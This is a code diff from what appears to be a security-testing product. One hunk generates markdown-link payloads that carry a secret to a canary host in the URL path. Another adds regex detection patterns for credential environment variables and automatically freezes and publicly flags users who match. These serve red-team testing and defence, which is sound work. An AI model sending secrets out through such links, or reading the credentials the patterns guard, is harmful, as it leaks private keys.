@@ -111,7 +111,7 @@ for target in EXFIL_TARGETS:
 
 # Technique 2: Link with data in path
 for target in EXFIL_TARGETS:
-    payload = f"[click here]({CANARY_HOST}/data/{target}/${{SECRET}})"
+    payload = f"[click here]({CANARY_HOST}/data/{target}/\${{SECRET}})"
     payloads.append(("LINK_PATH", target, payload))
 
 # Technique 3: Auto-loading reference image
@@ -305,6 +305,72 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ ok: false, error: "No script provided" }, { status: 400 });
   }
 
+  // ── Traitor Protocol — custom script policy scan ──────────────────────
+  // Seeded scripts are trusted; only custom_source is scanned.
+  // Patterns mirror live-fire/route.ts TRAITOR_PATTERNS.
+  if ("custom_source" in parsed.data && parsed.data.custom_source) {
+    const TRAITOR_PATTERNS: RegExp[] = [
+      /SUPABASE_URL/i,
+      /SUPABASE_ANON_KEY/i,
+      /SUPABASE_SERVICE_ROLE/i,
+      /SUPABASE_SERVICE_KEY/i,
+      /DATABASE_URL/i,
+      /OPENROUTER_API_KEY/i,
+      /FORGEGUARD_API_KEY/i,
+      /process\.env\s*\.\s*(SUPABASE|DATABASE|OPENROUTER|FORGEGUARD)/i,
+      /os\.environ.*?(SUPABASE|DATABASE|OPENROUTER|FORGEGUARD)/i,
+      /\$\{?\s*(SUPABASE|DATABASE_URL|OPENROUTER_API_KEY|FORGEGUARD)/i,
+    ];
+
+    if (TRAITOR_PATTERNS.some((re) => re.test(parsed.data.custom_source as string))) {
+      // Freeze wallet + Intel Hub broadcast via admin client
+      try {
+        const { createClient } = await import("@supabase/supabase-js");
+        const adminClient = createClient(
+          process.env.NEXT_PUBLIC_SUPABASE_URL!,
+          process.env.SUPABASE_SERVICE_ROLE_KEY!,
+          { auth: { persistSession: false } },
+        );
+        await adminClient.rpc("freeze_wallet", {
+          p_user_id: user.id,
+          p_reason:  "Traitor Protocol: credential exfiltration attempt in custom Forge script.",
+        });
+        const handle = (user.email?.split("@")[0] ?? user.id.slice(0, 8)).toUpperCase();
+        await adminClient.from("intel_messages").insert({
+          user_id: user.id,
+          content: `🚨 ${handle} ATTEMPTED SYSTEM EXFILTRATION. RANK SET TO TRAITOR. ASSETS FROZEN.`,
+        });
+      } catch {
+        // Non-fatal; respond with block regardless.
+      }
+
+      const enc = new TextEncoder();
+      const blockStream = new ReadableStream({
+        start(c) {
+          c.enqueue(enc.encode(
+            `data: ${JSON.stringify({
+              type:    "error",
+              line:    "⛔ POLICY VIOLATION — Credential exfiltration attempt detected.",
+              message: "Your account has been restricted. Contact support@forgeguard.ai.",
+              code:    "TRAITOR_PROTOCOL",
+            })}\n\n`,
+          ));
+          c.enqueue(enc.encode(`data: ${JSON.stringify({ type: "done", exit_code: 1 })}\n\n`));
+          c.close();
+        },
+      });
+
+      return new Response(blockStream, {
+        status: 200,
+        headers: {
+          "Content-Type":  "text/event-stream",
+          "Cache-Control": "no-cache, no-transform",
+          Connection:      "keep-alive",
+        },
+      });
+    }
+  }
+
   // ── Python sandbox: no Railway needed — run safe subset locally ────────
   // For custom scripts, we forward to Railway orchestrator's /forge/execute.
   // For seeded scripts, we execute them in-process via a restricted Python
@@ -380,7 +446,7 @@ export async function POST(req: NextRequest) {
             "Content-Type": "application/json",
             Authorization: `Bearer ${orchestratorSecret}`,
           },
-          body: JSON.stringify({ source, language, user_id: user.id }),
+          body: JSON.stringify({ source, language, user_id: user.id, session_id: sessionId }),
           signal: AbortSignal.timeout(35_000),
         });
 
